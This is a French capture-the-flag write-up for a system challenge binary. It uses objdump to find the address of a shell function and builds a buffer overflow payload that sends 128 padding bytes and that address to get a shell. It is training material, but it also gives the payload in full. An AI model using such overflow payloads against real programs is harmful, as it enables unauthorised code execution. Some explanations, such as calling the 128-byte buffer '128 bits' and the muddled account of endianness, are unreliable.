
(Faire le début avec l'analyse de code)


Utilisation de objdump pour trouver l'adresse mémoire utiliser par le shell : 

```bash
objdump -d ./ch15|grep shell
```

-d permet de dire à objdump qu'on souhaite désassemblé le fichier binaire ./ch15

Mais à quoi sert objdump ? 

objdump sert à inspecter mais aussi à analyser des fichiers binaires. Elle peut permettre de faire beaucoup de choses mais ici nous l'avons utiliser comme un extracteur d'adresse mémoire du shell utiliser.

Voici le tableau help de objdump : 

```bash
app-systeme-ch15@challenge02:~$ objdump
Usage: objdump <option(s)> <file(s)>
 Display information from object <file(s)>.
 At least one of the following switches must be given:
  -a, --archive-headers    Display archive header information
  -f, --file-headers       Display the contents of the overall file header
  -p, --private-headers    Display object format specific file header contents
  -P, --private=OPT,OPT... Display object format specific contents
  -h, --[section-]headers  Display the contents of the section headers
  -x, --all-headers        Display the contents of all headers
  -d, --disassemble        Display assembler contents of executable sections
  -D, --disassemble-all    Display assembler contents of all sections
  -S, --source             Intermix source code with disassembly
  -s, --full-contents      Display the full contents of all sections requested
  -g, --debugging          Display debug information in object file
  -e, --debugging-tags     Display debug information using ctags style
  -G, --stabs              Display (in raw form) any STABS info in the file
  -W[lLiaprmfFsoRtUuTgAckK] or
  --dwarf[=rawline,=decodedline,=info,=abbrev,=pubnames,=aranges,=macro,=frames,
          =frames-interp,=str,=loc,=Ranges,=pubtypes,
          =gdb_index,=trace_info,=trace_abbrev,=trace_aranges,
          =addr,=cu_index,=links,=follow-links]
                           Display DWARF info in the file
  -t, --syms               Display the contents of the symbol table(s)
  -T, --dynamic-syms       Display the contents of the dynamic symbol table
  -r, --reloc              Display the relocation entries in the file
  -R, --dynamic-reloc      Display the dynamic relocation entries in the file
  @<file>                  Read options from <file>
  -v, --version            Display this program's version number
  -i, --info               List object formats and architectures supported
  -H, --help               Display this information
```


On trouve avec notre commande : 

![](../img/Pasted%20image%2020260930002613.png)

Okay cool on à notre adresse. Mais attention !  rappeler vous qu'il y a une différences entre le système et ce qu'il vous renvoie. Actuellement il vous envoie l'adresse mémoire sous le format d'un Big Endian ce qui veut dire que le bit de poids fort se situe à gauche. Mais le système lui prend en Little Endian donc le bit de poids faible à gauche.

Avant de faire nos buffer overflow comme d'habitude nous allons changer cela: 

Voici l'adresse mémoire en Little Endian : 

```
16850408
```

Maintenant que c'est fais nous allons faire notre payload mais avant tous rappelez-vous qu'il faut mettre le format \x avec python pour dire que c'est de l'hexa et tous le tralalala.

A chaque paire hexa nous allons les mettres sous le bon format :
```python
\x16\x85\x04\x08
```

C'est bon vous êtes prêt !  


Payload finale : 

```bash
(python -c 'print " "*128 + "\x16\x85\x04\x08"';cat)|./ch15
```

![](../img/Pasted%20image%2020260930003032.png)

Comme vu précédemment le buffer à une taille de 128 bits, on le dépasse avec `*128`  et on fais notre code arbitraire